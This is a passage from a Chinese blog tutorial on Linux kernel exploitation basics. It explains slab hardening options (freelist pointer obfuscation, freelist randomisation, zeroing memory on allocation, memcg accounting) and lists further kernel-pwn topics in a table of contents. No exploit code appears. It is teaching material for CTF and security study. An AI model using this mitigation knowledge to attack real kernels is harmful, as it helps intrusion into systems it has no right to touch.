<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			(<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CONFIG-SLAB-FREELIST-RANDOM"><a href="#CONFIG-SLAB-FREELIST-RANDOM" class="headerlink" title="CONFIG_SLAB_FREELIST_RANDOM"></a>CONFIG_SLAB_FREELIST_RANDOM</h3><p><code>CONFIG_SLAB_FREELIST_RANDOM=y</code> 编译选项开启 Random freelist 保护。<br>这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object 之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址</p>
<p>需要注意的是这种保护发生在slub allocator 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c81b7db51c45c08b72566e44bb812f6e.png"
                      alt="image.png"
                ></p>
<h3 id="CONFIG-INIT-ON-ALLOC-DEFAULT-ON"><a href="#CONFIG-INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="CONFIG_INIT_ON_ALLOC_DEFAULT_ON"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h3><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h3 id="CONFIG-MEMCG-KMEM"><a href="#CONFIG-MEMCG-KMEM" class="headerlink" title="CONFIG_MEMCG_KMEM"></a>CONFIG_MEMCG_KMEM</h3><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 隔离。</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux kernel pwn 基础知识</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 20:23:30</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-12-27 01:17:10
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-kernel-pwn/">#linux kernel pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-kernel-pwn-exploit-technique/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux kernel pwn 内核利用</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/musl-pwn/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">musl pwn</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux kernel pwn 基础知识</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8%E6%A6%82%E8%BF%B0"><span class="nav-text">linux 内核概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A6%82%E8%BF%B0"><span class="nav-text">内核概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%9A%84%E8%81%8C%E8%B4%A3"><span class="nav-text">内核的职责</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">内核的分类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%86%85%E6%A0%B8%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-text">Linux 内核的特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="nav-text">Linux 内核版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="nav-text">版本命名规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">版本的类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E6%B4%BB%E8%B7%83%E7%9A%84%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="nav-text">当前活跃的内核版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="nav-text">查看系统版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#uname-%E5%91%BD%E4%BB%A4"><span class="nav-text">uname 命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B-proc-version-%E6%96%87%E4%BB%B6"><span class="nav-text">查看 &#x2F;proc&#x2F;version 文件</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel-pwn-%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80"><span class="nav-text">kernel pwn 环境基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F"><span class="nav-text">内核镜像</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%E7%9A%84%E7%B1%BB%E5%88%AB"><span class="nav-text">内核镜像的类别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-vmlinux"><span class="nav-text">获取 vmlinux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8"><span class="nav-text">编译内核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vmlinux-to-elf"><span class="nav-text">vmlinux-to-elf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F"><span class="nav-text">下载镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bzImage-%E8%A7%A3%E5%8E%8B%EF%BC%88%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-text">bzImage 解压（不推荐）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">文件系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%88%AB"><span class="nav-text">文件系统类别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cpio"><span class="nav-text">cpio</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%B6%E4%BD%9C"><span class="nav-text">文件系统制作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%8E%8B"><span class="nav-text">文件系统解压</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%89%93%E5%8C%85"><span class="nav-text">文件系统打包</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#img-Raw-Image"><span class="nav-text">img (Raw Image)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%B6%E4%BD%9C-1"><span class="nav-text">文件系统制作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%89%93%E5%8C%85-1"><span class="nav-text">文件系统打包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QEMU-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="nav-text">QEMU 文件系统配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#initrd"><span class="nav-text">-initrd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hda-root"><span class="nav-text">-hda &amp; root&#x3D;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="nav-text">文件系统加载过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA"><span class="nav-text">Linux 文件系统创建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-busybox"><span class="nav-text">编译 busybox</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">初始化文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E5%88%9D%E5%A7%8B%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="nav-text">配置初始化脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#initrd-%E7%A3%81%E7%9B%98%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E8%B7%AF%E5%BE%84"><span class="nav-text">initrd 磁盘启动脚本路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#hda-%E7%A3%81%E7%9B%98%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E8%B7%AF%E5%BE%84"><span class="nav-text">hda 磁盘启动脚本路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE-init-%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">配置 init 启动脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%84"><span class="nav-text">配置用户组</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E4%B8%8E%E8%B0%83%E8%AF%95"><span class="nav-text">运行与调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%90%AF%E5%8A%A8"><span class="nav-text">内核启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95"><span class="nav-text">内核调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%9C%B0%E5%9D%80%E7%9A%84%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95"><span class="nav-text">关键地址的获取方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">获取模块基址的方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">获取内核符号的方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">获取内核基址的方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%98%BE%E7%A4%BA%E7%9B%B8%E5%85%B3%E4%BF%9D%E6%8A%A4"><span class="nav-text">数据显示相关保护</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QEMU-%E4%BB%BF%E7%9C%9F%E7%9A%84%E7%AE%80%E6%98%93-Linux-%E7%8E%AF%E5%A2%83"><span class="nav-text">QEMU 仿真的简易 Linux 环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Vmware-%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%8C%E6%95%B4-Linux-%E7%B3%BB%E7%BB%9F"><span class="nav-text">Vmware 运行的完整 Linux 系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B-exp-%E4%BC%A0%E8%BE%93"><span class="nav-text">远程 exp 传输</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="nav-text">Linux 内核模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6"><span class="nav-text">万物皆文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-VFS"><span class="nav-text">虚拟文件系统 (VFS)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="nav-text">文件操作函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80"><span class="nav-text">内核模块环境基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E5%BA%93"><span class="nav-text">内核模块开发库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E4%BB%A3%E7%A0%81%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90"><span class="nav-text">内核模块代码基本组成</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E7%9A%84%E8%AE%B8%E5%8F%AF%E8%AF%81"><span class="nav-text">模块的许可证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8D%B8%E8%BD%BD%E5%87%BD%E6%95%B0"><span class="nav-text">加载和卸载函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91%E8%84%9A%E6%9C%AC"><span class="nav-text">内核模块编译脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9-clion-%E6%94%AF%E6%8C%81%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91"><span class="nav-text">如何让 clion 支持内核模块开发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD"><span class="nav-text">内核模块加载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80"><span class="nav-text">内核模块开发基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0"><span class="nav-text">日志打印</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="nav-text">参数传递</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E5%8F%82%E6%95%B0"><span class="nav-text">定义参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E6%97%B6%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0"><span class="nav-text">加载模块时传递参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8-sysfs-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E5%92%8C%E4%BF%AE%E6%94%B9%E5%8F%82%E6%95%B0"><span class="nav-text">在 sysfs 中查看和修改参数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9B%B8%E5%85%B3"><span class="nav-text">内存管理相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E9%87%8A%E6%94%BE"><span class="nav-text">内存申请释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%8B%B7%E8%B4%9D"><span class="nav-text">内存拷贝</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98"><span class="nav-text">同步问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E6%97%8B%E9%94%81%EF%BC%88Spinlocks%EF%BC%89"><span class="nav-text">自旋锁（Spinlocks）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%92%E6%96%A5%E9%94%81%EF%BC%88Mutexes%EF%BC%89"><span class="nav-text">互斥锁（Mutexes）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E9%94%81%EF%BC%88Read-Write-Locks%EF%BC%89"><span class="nav-text">读写锁（Read-Write Locks）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E5%8F%B7%E9%87%8F%EF%BC%88Semaphores%EF%BC%89"><span class="nav-text">信号量（Semaphores）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%EF%BC%88Atomic-Operations%EF%BC%89"><span class="nav-text">原子操作（Atomic Operations）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91"><span class="nav-text">设备模块开发</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ring-Model"><span class="nav-text">Ring Model</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-1"><span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">权限保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">段保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90%EF%BC%88Segment-Selector%EF%BC%89"><span class="nav-text">段选择子（Segment Selector）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88Descriptor%EF%BC%89"><span class="nav-text">段描述符（Descriptor）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%B1%BB%E5%9E%8B"><span class="nav-text">权限类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5%E8%BF%87%E7%A8%8B"><span class="nav-text">权限检查过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">页保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E5%AD%97%E6%AE%B5"><span class="nav-text">权限字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-%E7%9A%84-KPTI-%E6%9C%BA%E5%88%B6"><span class="nav-text">Linux 的 KPTI 机制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%95%88%E6%9E%9C"><span class="nav-text">保护效果</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B-KPTI-%E5%BC%80%E5%90%AF%E6%83%85%E5%86%B5"><span class="nav-text">查看 KPTI 开启情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E6%88%96%E5%85%B3%E9%97%AD-KPTI"><span class="nav-text">开启或关闭 KPTI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CPU-%E7%A1%AC%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">CPU 硬件保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMEP"><span class="nav-text">SMEP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMAP"><span class="nav-text">SMAP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-2"><span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="nav-text">x86 系统调用相关指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">系统调用指令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#int-0x80"><span class="nav-text">int 0x80</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sysenter"><span class="nav-text">sysenter</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81%E6%8C%87%E4%BB%A4"><span class="nav-text">返回用户态指令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#retf%EF%BC%88%E8%BF%9C%E8%BF%94%E5%9B%9E%E6%8C%87%E4%BB%A4%EF%BC%89"><span class="nav-text">retf（远返回指令）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iretd%EF%BC%88%E4%B8%AD%E6%96%AD%E8%BF%94%E5%9B%9E%E6%8C%87%E4%BB%A4%EF%BC%89"><span class="nav-text">iretd（中断返回指令）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sysexit%EF%BC%88%E5%BF%AB%E9%80%9F%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%BF%94%E5%9B%9E%E6%8C%87%E4%BB%A4%EF%BC%89"><span class="nav-text">sysexit（快速系统调用返回指令）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="nav-text">x86-64 系统调用相关指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%8C%87%E4%BB%A4-1"><span class="nav-text">系统调用指令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#syscall"><span class="nav-text">syscall</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81%E6%8C%87%E4%BB%A4-1"><span class="nav-text">返回用户态指令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#iretq"><span class="nav-text">iretq</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 